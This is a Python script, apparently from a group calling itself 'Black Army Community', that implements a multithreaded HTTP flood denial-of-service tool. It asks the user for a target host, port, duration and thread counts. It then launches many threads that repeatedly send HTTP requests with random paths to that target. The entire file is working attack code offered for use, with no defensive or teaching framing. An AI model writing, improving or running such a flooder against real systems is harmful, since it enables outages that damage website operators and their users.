# CHECK IMPORT
try:
    import socket
    import threading
    import string
    import random
    import time
    import os
    import platform
    import sys
    from colorama import Fore
except ModuleNotFoundError as e:
    print(f"{e} CAN'T IMPORT . . . .")
    exit()

# DEF & CLASS

def clear_text():
    if platform.system().upper() == "WINDOWS":
        os.system('cls')
    else:
        os.system('clear')

def status_print(ip,port,thread_id,rps,path_get):
    time.sleep(2)
    print(f"{Fore.MAGENTA}[] {Fore.LIGHTYELLOW_EX}SRIKANDI-313 {Fore.CYAN}:: {Fore.LIGHTBLUE_EX}REQUEST ATTACK {Fore.WHITE}=⟩ {Fore.LIGHTMAGENTA_EX}HTTP{Fore.BLUE}TARGET {Fore.YELLOW}= {Fore.LIGHTMAGENTA_EX}{ip}:{port} {Fore.RESET}")
def generate_url_path_pyflooder(num):
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, int(num)))
    return data
    
def generate_url_path_choice(num):
    letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
    data = ""
    for _ in range(int(num)):
        data += random.choice(letter)
    return data

# DOS
def DoS_Attack(ip,host,port,type_attack,id,booter_sent):
    rps = 0
    url_path = ''
    path_get = ['SYN_FLOOD','CHOIS_FLOOD']
    path_get_loader = random.choice((path_get))
    if path_get_loader == "SYN_FLOOD":
        url_path = generate_url_path_pyflooder(5)
    else:
        url_path = generate_url_path_choice(5)
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n".encode()
        s.connect((ip,port))
        for _ in range(booter_sent):
            s.sendall(packet_data)
            s.send(packet_data)
            rps += 2
    except:
        try:
            s.shutdown(socket.SHUT_RDWR)
            s.close()
        except:
            pass
    status_print(ip,port,id,rps,path_get_loader)

status_code = False
id_loader = 0
def runing_attack(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent):
    global status_code,id_loader
    if status_code == True:
        while time.time() < time_loader:
            for _ in range(spam_loader):
                id_loader += 1
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
                th.start()
    else:
        threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()





#DATA
banner = f""" 
{Fore.BLACK}
{Fore.BLACK}═════════════════════════════════════════════════════
{Fore.BLACK}
{Fore.BLACK}
{Fore.GREEN}  ████{Fore.YELLOW}═╗ {Fore.GREEN}█████{Fore.YELLOW}═╗  {Fore.GREEN}█{Fore.YELLOW}═╗ {Fore.GREEN}█{Fore.YELLOW}═╗ {Fore.GREEN}█{Fore.YELLOW}═╗  {Fore.GREEN}███{Fore.YELLOW}═╗ {Fore.GREEN} ██{Fore.YELLOW}═╗ {Fore.GREEN}  █{Fore.YELLOW}═╗ {Fore.GREEN}█████{Fore.YELLOW}═╗ {Fore.GREEN}█{Fore.YELLOW}═╗
{Fore.GREEN}  █{Fore.YELLOW} ╔══╝ {Fore.GREEN}█{Fore.YELLOW} ╔═ {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║{Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ╔═ {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█ █{Fore.YELLOW} ║ {Fore.GREEN} █{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW}  ║ {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║
{Fore.GREEN}  █{Fore.YELLOW} ║ {Fore.GREEN}   █{Fore.YELLOW} ║ {Fore.GREEN} █{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█ █{Fore.YELLOW} ║ {Fore.GREEN} █{Fore.YELLOW} ║ {Fore.GREEN} █{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW}  ║ {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║
{Fore.GREEN}  ████{Fore.YELLOW}═╗ {Fore.GREEN}█████{Fore.YELLOW} ║  {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}██{Fore.YELLOW}╔╝   {Fore.GREEN}█████{Fore.YELLOW}  ║ {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW}  ║ {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║
{Fore.GREEN}     █{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ╚╗ {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█ █{Fore.YELLOW} ╚╗ {Fore.GREEN}█{Fore.YELLOW} ╔═ {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN} █{Fore.YELLOW}║ {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW}  ║ {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║
{Fore.GREEN}  ████{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN} █{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║{Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN} █{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║ {Fore.GREEN} ██{Fore.YELLOW}  ║ {Fore.GREEN}█████{Fore.YELLOW} ║ {Fore.GREEN}█{Fore.YELLOW} ║  
{Fore.YELLOW}   ╚═══╝ ╚═╝  ╚═  ╚═  ╚═  ╚═  ╚═  ╚═ ╚═  ╚══  ╚═════ ╚══
{Fore.BLACK}
{Fore.WHITE}         B L A C K  A R M Y  C O M M U N I T Y  
{Fore.GREEN}                    INTERNAL SCRIPT                
{Fore.BLUE}                     ATTACK ZEON                  
{Fore.WHITE}                      —oO0Oo—                       
{Fore.BLACK}                                                       
{Fore.BLACK}═══════════════════════════════════════════════════
:::—⟩ Waiting for loading ...!! <==={Fore.RESET}"""

print(banner)
host = ""
ip = ""
target_loader = input(f"{Fore.CYAN}::IP/URL==⟩⟩{Fore.LIGHTYELLOW_EX}")
port_loader = int(input(f"{Fore.CYAN}::PORT==⟩⟩{Fore.LIGHTYELLOW_EX }"))
time_loader = time.time() + int(input(f"{Fore.CYAN}::TIME ==⟩⟩{Fore.LIGHTYELLOW_EX}"))
spam_loader = int(input(f"{Fore.CYAN}::SPAM THREAD ==⟩⟩{Fore.LIGHTYELLOW_EX}"))
create_thread = int(input(F"{Fore.CYAN}::CREATE THREAD ==⟩⟩{Fore.LIGHTYELLOW_EX}"))
booter_sent = int(input(F"{Fore.CYAN}::BOOTER SENT ==⟩⟩{Fore.LIGHTYELLOW_EX}"))
print(f"{Fore.LIGHTBLUE_EX}EXAMPLE HTTP METHODS> CONNECT GET POST HEAD")
print(f"{Fore.LIGHTBLUE_EX}EXAMPLE CUSTOM HTTP METHODS> CLOUDFLARE AGE PYFLOODER GATEWAY")
methods_loader = input(F"{Fore.CYAN}::HTTP_METHODS ==⟩{Fore.LIGHTYELLOW_EX}")
print(f"{Fore.LIGHTBLUE_EX}TRYING TO GET IP:PORT {Fore.LIGHTMAGENTA_EX}. . .{Fore.RESET}")
try:
    host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
    ip = socket.gethostbyname(host)
except socket.gaierror:
    exit()
for loader_num in range(create_thread):
    sys.stdout.write(f"\r {Fore.YELLOW}{loader_num} CREATE THREAD . . .{Fore.RESET}")
    sys.stdout.flush()
    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
clear_text()
print(banner)
status_code = True
print(f"{Fore.GREEN}STAR ATTACK...!! {Fore.RESET}")
